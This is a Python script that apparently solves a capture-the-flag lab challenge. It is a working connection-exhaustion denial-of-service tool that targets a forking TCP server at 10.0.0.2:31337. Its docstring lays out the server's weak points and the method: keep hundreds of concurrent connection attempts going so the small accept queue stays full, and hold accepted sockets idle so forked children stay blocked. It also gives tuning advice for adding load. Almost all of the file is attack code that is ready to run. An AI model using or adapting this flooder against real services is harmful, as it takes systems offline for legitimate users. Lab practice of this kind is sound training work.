#!/usr/bin/env python3
"""
ddos_3 — connection-exhaustion attack against the lab's ForkingTCPServer.

You do NOT send anything to the client (10.0.0.3). The client connects to the
SERVER (10.0.0.2:31337) by itself and prints the flag when ITS OWN connect()
times out (see ./run). Our only job: hammer the server so the client's connect
can't complete within its 60-second timeout.

Server weaknesses (./run lines 15-26):
  - ForkingTCPServer: max_children = 40 (concurrency cap)
  - listen backlog request_queue_size = 5 (tiny accept queue)
  - each handler blocks up to 1s in recv() before returning

Attack = two pressures at once:
  1. STARVE THROUGHPUT: for connections the server accepts, send NOTHING and
     hold the socket open ~1s so each forked child burns its full 1s recv
     timeout. That caps the server at ~40 handled connections/second.
  2. FLOOD SYNs: keep hundreds of connection attempts in flight with a SHORT
     connect timeout so stuck attempts recycle immediately and keep firing
     fresh SYN packets. This keeps the 5-slot accept queue permanently full,
     so the client's SYN (and every retransmit) gets dropped -> 60s connect
     timeout -> flag printed to this terminal.

Why asyncio, not threads: one thread holds hundreds of sockets while mostly
awaiting a sleep, so CPU/RAM stay tiny. CONCURRENCY is the single load dial.

Run inside the lab shell (./run drops you on user_host 10.0.0.1):
    python ddos_3.py
Leave it running; the flag prints here within ~1-2 minutes. Ctrl-C to stop.
If no flag after ~2 min, raise CONCURRENCY (e.g. 800 or 1200).

Optional — cap the HARDWARE the *challenge* uses while testing locally (wrap the
whole lab, not this script):
    systemd-run --user --scope -p CPUQuota=50% -p MemoryMax=512M ./run
    # or, before ./run:   ulimit -v 524288
"""

import asyncio
import resource

# ---- tunables -------------------------------------------------------------
TARGET_HOST = "10.0.0.2"
TARGET_PORT = 31337
CONCURRENCY = 600       # sockets/attempts in flight at once (main load dial)
CONNECT_TIMEOUT = 2.0   # short: stuck attempts recycle fast -> high SYN rate
HOLD_SECONDS = 1.1      # for accepted conns: pin the forked child past its 1s recv
# ---------------------------------------------------------------------------


def raise_fd_limit() -> None:
    """Let us hold CONCURRENCY sockets without hitting the open-file cap."""
    try:
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
    except (ValueError, OSError):
        pass  # not permitted in the sandbox -> just keep CONCURRENCY modest


async def flooder() -> None:
    """Fire a connect; if it lands, hold it idle to burn a child; always retry."""
    while True:
        writer = None
        try:
            _reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET_HOST, TARGET_PORT),
                timeout=CONNECT_TIMEOUT,
            )
            # Connected: send NOTHING, hold so the server's child stays stuck
            # in recv() for its full 1s timeout.
            await asyncio.sleep(HOLD_SECONDS)
        except (OSError, asyncio.TimeoutError):
            pass  # dropped SYN / reset / timeout -> immediately fire a fresh one
        finally:
            if writer is not None:
                try:
                    writer.close()
                except OSError:
                    pass


async def main() -> None:
    raise_fd_limit()
    print(f"[*] Flooding {TARGET_HOST}:{TARGET_PORT} with {CONCURRENCY} "
          f"connection attempts in flight (Ctrl-C to stop)...", flush=True)
    print("[*] Keep this running; the client's flag should print here within "
          "~1-2 minutes.", flush=True)
    await asyncio.gather(*(flooder() for _ in range(CONCURRENCY)))


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Stopped.", flush=True)
